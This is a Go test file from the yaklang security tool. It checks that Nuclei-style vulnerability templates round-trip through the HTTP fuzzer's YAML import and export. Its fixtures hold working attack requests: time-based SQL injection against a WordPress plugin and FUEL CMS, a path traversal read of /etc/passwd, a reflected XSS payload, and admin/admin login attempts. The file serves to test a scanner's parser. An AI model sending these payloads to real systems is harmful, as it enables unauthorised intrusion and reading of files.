package yakgrpc

import (
	"context"
	"github.com/yaklang/yaklang/common/go-funk"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/yakgrpc/ypb"
	"gopkg.in/yaml.v2"
	"testing"
)

func CompareNucleiYaml(yaml1, yaml2 string) bool {
	yarml1Map := make(map[string]interface{})
	yarml2Map := make(map[string]interface{})
	if yaml.Unmarshal([]byte(yaml1), &yarml1Map) != nil {
		panic("unmarshal yaml1 failed")
	}
	if yaml.Unmarshal([]byte(yaml2), &yarml2Map) != nil {
		panic("unmarshal yaml2 failed")
	}
	httpPackages := map[string]string{}
	for _, httpReq := range utils.InterfaceToSliceInterface(utils.MapGetRaw(yarml1Map, "http")) {
		httpReqMap := utils.InterfaceToMapInterface(httpReq)
		raws := utils.InterfaceToSliceInterface(httpReqMap["raw"])
		matchers := utils.InterfaceToSliceInterface(httpReqMap["matchers"])
		extractors := utils.InterfaceToSliceInterface(httpReqMap["extractors"])
		keys := funk.Keys(httpReqMap)
		otherFields := []string{}
		for _, k := range utils.InterfaceToSliceInterface(keys) {
			if k == "raw" || k == "matchers" || k == "extractors" {
				continue
			}
			key := utils.InterfaceToString(k)
			otherFields = append(otherFields, key+":"+utils.InterfaceToString(httpReqMap[key]))
		}
		for _, raw := range raws {
			httpPackages[utils.InterfaceToString(raw)] = utils.InterfaceToString(matchers) + utils.InterfaceToString(extractors) + utils.InterfaceToString(otherFields)
		}

	}

	for _, httpReq := range utils.InterfaceToSliceInterface(utils.MapGetRaw(yarml2Map, "http")) {
		httpReqMap := utils.InterfaceToMapInterface(httpReq)
		raws := utils.InterfaceToSliceInterface(httpReqMap["raw"])
		matchers := utils.InterfaceToSliceInterface(httpReqMap["matchers"])
		extractors := utils.InterfaceToSliceInterface(httpReqMap["extractors"])
		isSame := true
		otherFields := []string{}
		keys := funk.Keys(httpReqMap)
		for _, k := range utils.InterfaceToSliceInterface(keys) {
			if k == "raw" || k == "matchers" || k == "extractors" {
				continue
			}
			key := utils.InterfaceToString(k)
			otherFields = append(otherFields, key+":"+utils.InterfaceToString(httpReqMap[key]))
		}
		for _, raw := range raws {
			if v, ok := httpPackages[utils.InterfaceToString(raw)]; ok {
				if v != utils.InterfaceToString(matchers)+utils.InterfaceToString(extractors)+utils.InterfaceToString(otherFields) {
					isSame = false
				}
			}
			if !isSame {
				return false
			}
		}
	}
	return true
}
func TestTestGRPCMUSTPASS_WebFuzzerSequenceConvertYaml(t *testing.T) {
	client, err := NewLocalClient()
	if err != nil {
		t.Fatal(err)
	}
	testCases := []struct {
		content string
		expect  string
		err     string
	}{
		{ // 一个请求节点包含两个请求，预期解析为两个请求节点
			content: `http:
  - raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        log={{username}}&pwd={{password}}&wp-submit=Log+In

      - |
        @timeout: 10s
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        content-type: application/x-www-form-urlencoded

        action=parse-media-shortcode&shortcode=[wptripadvisor_usetemplate+tid="1+AND+(SELECT+42+FROM+(SELECT(SLEEP(6)))b)"]

    cookie-reuse: true
    matchers:
      - type: dsl
        dsl:
          - 'duration_2>=6'
          - 'status_code_2 == 200'
          - 'contains(content_type_2, "application/json")'
          - 'contains(body_2, "\"data\":{")'
        condition: and
`,
			expect: `http:
  - raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        log={{username}}&pwd={{password}}&wp-submit=Log+In
    cookie-reuse: true
    matchers:
      - type: dsl
        dsl:
          - 'duration_2>=6'
          - 'status_code_2 == 200'
          - 'contains(content_type_2, "application/json")'
          - 'contains(body_2, "\"data\":{")'
        condition: and
  - raw:      
      - |
        @timeout: 10s
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        content-type: application/x-www-form-urlencoded

        action=parse-media-shortcode&shortcode=[wptripadvisor_usetemplate+tid="1+AND+(SELECT+42+FROM+(SELECT(SLEEP(6)))b)"]
    cookie-reuse: true
    matchers:
      - type: dsl
        dsl:
          - 'duration_2>=6'
          - 'status_code_2 == 200'
          - 'contains(content_type_2, "application/json")'
          - 'contains(body_2, "\"data\":{")'
        condition: and
`,
		},
		{ // path请求，预期解析为raw请求，匹配器不变
			content: `http:
  - method: GET
    path:
      - '{{BaseURL}}/images//////////////////../../../../../../../../etc/passwd'

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:[x*]:0:0"

      - type: word
        part: header
        words:
          - content/unknown

      - type: status
        status:
          - 200`,
			expect: `http:
  - raw:
    - |+
      GET {{PathTrimEndSlash}}/images//////////////////../../../../../../../../etc/passwd HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:[x*]:0:0"

      - type: word
        part: header
        words:
          - content/unknown

      - type: status
        status:
          - 200
`,
		},
		{ // 一些配置
			content: `http:
  - raw:
      - |
        POST /search-locker-details.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        searchinput=%E2%80%9C%2F%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&submit=

    cookie-reuse: true
    redirects: true
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "/><script>alert(document.domain)</script>")'
          - 'contains(body, "Bank Locker Management System")'
        condition: and`,
			expect: `http:
  - raw:
      - |
        POST /search-locker-details.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        searchinput=%E2%80%9C%2F%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&submit=

    cookie-reuse: true
    redirects: true
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "/><script>alert(document.domain)</script>")'
          - 'contains(body, "Bank Locker Management System")'
        condition: and`,
		},
		{ // 包含payload等其它配置，验证生成配置完整且有序
			content: `http:
  - raw:
      - |
        GET /fuel/login/ HTTP/1.1
        Host: {{Hostname}}
      - |
        POST /fuel/login/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Referer: {{RootURL}}

        user_name={{username}}&password={{password}}&Login=Login&forward=
      - |
        @timeout: 10s
        GET /fuel/pages/items/?search_term=&published=&layout=&limit=50&view_type=list&offset=0&order=asc&col=location+AND+(SELECT+1340+FROM+(SELECT(SLEEP(6)))ULQV)&fuel_inline=0 HTTP/1.1
        Host: {{Hostname}}
        X-Requested-With: XMLHttpRequest
        Referer: {{RootURL}}

    payloads:
      username:
        - admin
      password:
        - admin
    attack: pitchfork
    cookie-reuse: true
    matchers:
      - type: dsl
        dsl:
          - 'duration>=6'
          - 'status_code_3 == 200'
          - 'contains(body_1, "FUEL CMS")'
        condition: and`,
			expect: `http:
  - raw:
      - |
        GET /fuel/login/ HTTP/1.1
        Host: {{Hostname}}
    payloads:
      username:
        - admin
      password:
        - admin
    attack: pitchfork
    cookie-reuse: true
    matchers:
      - type: dsl
        dsl:
          - 'duration>=6'
          - 'status_code_3 == 200'
          - 'contains(body_1, "FUEL CMS")'
        condition: and
  - raw:
      - |
        POST /fuel/login/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Referer: {{RootURL}}

        user_name={{username}}&password={{password}}&Login=Login&forward=

    payloads:
      username:
        - admin
      password:
        - admin
    attack: pitchfork
    cookie-reuse: true
    matchers:
      - type: dsl
        dsl:
          - 'duration>=6'
          - 'status_code_3 == 200'
          - 'contains(body_1, "FUEL CMS")'
        condition: and
  - raw:
      - |
        @timeout: 10s
        GET /fuel/pages/items/?search_term=&published=&layout=&limit=50&view_type=list&offset=0&order=asc&col=location+AND+(SELECT+1340+FROM+(SELECT(SLEEP(6)))ULQV)&fuel_inline=0 HTTP/1.1
        Host: {{Hostname}}
        X-Requested-With: XMLHttpRequest
        Referer: {{RootURL}}
    payloads:
      username:
        - admin
      password:
        - admin
    attack: pitchfork
    cookie-reuse: true
    matchers:
      - type: dsl
        dsl:
          - 'duration>=6'
          - 'status_code_3 == 200'
          - 'contains(body_1, "FUEL CMS")'
        condition: and`,
		},
		//{
		//	content: `---`,
		//	expect:  "",
		//},
	}
	for _, testCase := range testCases {
		rsp, err := client.ImportHTTPFuzzerTaskFromYaml(context.Background(), &ypb.ImportHTTPFuzzerTaskFromYamlRequest{
			YamlContent: testCase.content,
		})
		if err != nil {
			t.Fatal(err)
		}
		res, err := client.ExportHTTPFuzzerTaskToYaml(context.Background(), &ypb.ExportHTTPFuzzerTaskToYamlRequest{
			Requests: rsp.Requests,
		})

		if !CompareNucleiYaml(res.YamlContent, testCase.expect) {
			t.Fatal("expect:", testCase.expect, "got:", res.YamlContent)
		}
	}
}
